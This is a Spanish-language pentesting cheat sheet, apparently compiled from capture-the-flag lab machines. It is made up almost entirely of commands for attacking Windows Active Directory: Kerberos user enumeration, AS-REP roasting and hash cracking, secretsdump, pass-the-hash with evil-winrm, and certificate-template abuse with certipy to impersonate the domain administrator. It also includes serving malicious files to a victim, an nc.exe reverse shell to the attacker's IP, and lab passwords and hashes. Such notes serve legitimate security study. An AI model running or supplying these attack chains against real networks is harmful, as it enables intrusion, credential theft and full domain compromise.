### Enumeración con NMAP y ENUM4LINUX

#### Enumeración del SMB con smbmap
```java
smbmap -H $ip -u " "
smbmap -H 10.10.11.222 -u " "
````

#### TLD (Top Level Domain)

#### Kerberos para enumerar usuarios válidos en el dominio

```java
DIR: kali/kerbrute/dist

./kerbrute_linux_amd64 userenum --dc 10.10.202.165 -d spookysec.local userlist.txt
./kerbrute_linux_amd64 userenum --dc <ip> -d <tld o domain> <lista de usuarios>

--dc The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
-d, --domain string The full domain to use (e.g. contoso.com)
```

#### Impacket GetNPUsers.py para obtener hashes de los usuarios válidos

```java
DIR: /usr/share/doc/python3-impacket/examples

python GetNPUsers.py -no-pass -usersfile ./users.txt -dc-ip <target ip> spooky.local/
```

`user.txt` archivo que contiene los nombres de los usuarios válidos.

#### Hashcat para obtener la contraseña en texto claro

```java
hashcat -m 18200 hash.txt passwordlist.txt
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

#### SMBCLIENT para obtener los SHARES y obtener credenciales

```java
smbclient -L <target ip> -U svc-admin
smbclient \\\\<target ip>\\backup -U svc-admin "Para mostrar directorio específico"
```

#### Secretsdump.py para obtener el hash para hacer pass the hash

```java
DIR: /usr/share/doc/python3-impacket/examples

sudo python secretsdump.py -just-dc backup@10.10.202.165
sudo python secretsdump.py -just-dc <user>@<ip>
```

#### Pass the Hash con EvilWinRM

```java
evil-winrm -i <target ip> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
evil-winrm -i <target ip> -u Administrator -H <hash>
```

#### Subir archivos maliciosos con smbserver.py

```java
smbserver.py smbFolder $(pwd)
```

En la máquina víctima:

```java
copy \\10.10.14.132\smbFolder\MS11-046.exe
```

#### Comandos básicos:

```java
type: para mostrar los archivos
copy: para copiar archivos
dir: para mostrar archivos
systeminfo: obtener información y versión de Windows
upload: para subir archivos
net user: para obtener usuarios
```

#### NC.EXE para establecer una reverse shell en Windows

En la máquina víctima:

```java
nc.exe -e cmd 10.10.14.132 4444
```

#### Archivos ZIP Windows:

##### FCRACKZIP: Para obtener la contraseña del zip

```java
fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
```

Seguidamente, al tener el archivo .pfx extraído del zip, sacar la contraseña del archivo .pfx para poder obtener la "key" y el "cert".

##### pfx2john para extraer el hash del archivo .pfx

```java
pfx2john "archivo.pfx" > pfx_output.hash
```

```java
john -w=/usr/share/wordlists/rockyou.txt pfx_timelapse.hash --rule /usr/share/john/rules/rockyou-30000.rule
```

##### Con la contraseña obtenida, sacar la key y el cert con OpenSSL

KEY:

```java
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

CERT:

```java
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert
```

#### EvilWinRM con el archivo .pfx extraído para login sin usuario ni contraseña

```java
evil-winrm -S -i 10.10.11.152 -c key.cert -k key.pem
```

#### Directorios potenciales para obtener credenciales válidas en Windows para movimiento lateral

```java
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Si el usuario tiene LAPS READERS: Comando para obtener credenciales del administrador

```java
Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *
```

#### GPG-Decrypt

```java
gpg-decrypt 'key'
gpg-decrypt para conseguir contraseña de keys.gpg
```

#### Certipy-AD para obtener el pfx del administrador (PrivEsc7)

```java
certipy-ad ca -ca 'manager-DC01-CA' -add-officer Raven -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

```java
certipy-ad ca 'manager.htb/Raven:'R4v3nBe5tD3veloP3r!123'@ca.manager.htb' -ca 'manager-CA' -enable-template 'SubCA'
```

```java
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

```java
certipy-ad req -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator@manager.htb
```

```java
certipy-ad ca -ca 'manager-DC01-CA' -add-officer Raven -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

```java
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 39 -username Raven@manager.htb -password  'R4v3nBe5tD3veloP3r!123'
```

```java
certipy-ad req -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -retrieve 39
```

39 = Es el key que te da en:

```java
certipy-ad req -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target manager.htb -template SubCA -upn administrator@manager.htb
```

#### Obtener el hash

```java
certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
```

#### Sincronizar el tiempo con el servidor

```java
sudo ntpdate -s manager.htb
```

#### Luego con Evil-WinRM

```java
evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
```

#### Privilege escalation: SeMachineAccountPrivilege

```java
impacket-addcomputer -dc-ip 10.10.11.222 -computer-name hacker_PC -computer-pass pass1234 'htb.local/svc_ldap:lDaP_1n_th3_cle4r!'
```

```java
certipy-ad find -u "hacker_PC" -p "pass1234" -dc-ip 10.10.11.222
```

```java
certipy-ad req  -username "hacker_PC$" -p "pass1234" -template CorpVPN -dc-ip 10.10.11.222 -ca AUTHORITY-CA -upn 'Administrator@authority.htb'
```

```java
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.222
```

```java
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
```

```java
certipy-ad cert -pfx administrator.pfx -nocert -out user.key
```

```java
python passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass
```

```java
evil-winrm -i 10.10.11.222 --user administrator --password 'dcPEtzUjHpOSaGab4Kh99xOtlPUbsyiY'
```
